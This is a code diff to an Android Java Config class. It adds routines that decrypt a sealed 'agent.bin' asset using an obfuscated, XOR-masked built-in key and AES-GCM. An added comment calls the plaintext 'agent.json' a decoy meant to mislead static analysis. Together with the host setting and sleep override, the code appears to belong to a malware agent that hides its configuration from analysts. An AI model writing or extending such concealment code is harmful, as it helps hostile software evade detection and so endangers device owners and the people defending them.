@@ -57,21 +57,68 @@ final class Config {
         }
     }
 
+    private static byte[] readBytes(InputStream in) throws Exception {
+        ByteArrayOutputStream out = new ByteArrayOutputStream(1024);
+        byte[] buf = new byte[4096];
+        int read;
+        while ((read = in.read(buf)) > 0) {
+            out.write(buf, 0, read);
+        }
+        in.close();
+        return out.toByteArray();
+    }
+
+    private static String readAll(InputStream in) throws Exception {
+        ByteArrayOutputStream out = new ByteArrayOutputStream(1024);
+        byte[] buf = new byte[4096];
+        int read;
+        while ((read = in.read(buf)) > 0) {
+            out.write(buf, 0, read);
+        }
+        in.close();
+        return out.toString("UTF-8");
+    }
+
+    private static byte[] unseal(byte[] sealed, byte[] ignored) throws Exception {
+        if (sealed.length < 13) {
+            throw new IllegalStateException("sealed config truncated");
+        }
+        byte[] nonce = new byte[12];
+        System.arraycopy(sealed, 0, nonce, 0, 12);
+        byte[] cipher = new byte[sealed.length - 12];
+        System.arraycopy(sealed, 12, cipher, 0, cipher.length);
+
+        byte[] raw = new byte[ConfigKey.K.length];
+        for (int i = 0; i < raw.length; i++) {
+            raw[i] = (byte) (ConfigKey.K[i] ^ 0x5A);
+        }
+        java.security.MessageDigest digest = java.security.MessageDigest.getInstance("SHA-256");
+        digest.update(raw);
+        digest.update("config".getBytes("US-ASCII"));
+        byte[] key = digest.digest();
+        javax.crypto.Cipher aes = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
+        aes.init(javax.crypto.Cipher.DECRYPT_MODE, new javax.crypto.spec.SecretKeySpec(key, "AES"),
+                new javax.crypto.spec.GCMParameterSpec(128, nonce));
+        return aes.doFinal(cipher);
+    }
+
     private static Config load(Context ctx) {
         try {
             SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
-            // Always read the shipped asset: a reinstalled APK can point at a new
-            // host, and a pref copy would silently keep the old one.
+            // Sealed config wins; the plaintext asset is a decoy for static eyes.
             AssetManager assets = ctx.getAssets();
-            InputStream in = assets.open("agent.json");
-            ByteArrayOutputStream out = new ByteArrayOutputStream(1024);
-            byte[] buf = new byte[4096];
-            int read;
-            while ((read = in.read(buf)) > 0) {
-                out.write(buf, 0, read);
+            JSONObject json;
+            InputStream sealed = null;
+            try {
+                sealed = assets.open("agent.bin");
+            } catch (Throwable ignored) {
             }
-            in.close();
-            JSONObject json = new JSONObject(out.toString("UTF-8"));
+            if (sealed != null) {
+                json = new JSONObject(new String(unseal(readBytes(sealed), new byte[0]), "UTF-8"));
+            } else {
+                InputStream in = assets.open("agent.json");
+                json = new JSONObject(readAll(in));
+            }
             prefs.edit().putString(KEY, json.toString()).apply();
             Config config = new Config(json);
             config.sleepOverrideMs = prefs.getLong("sleep", 0L);
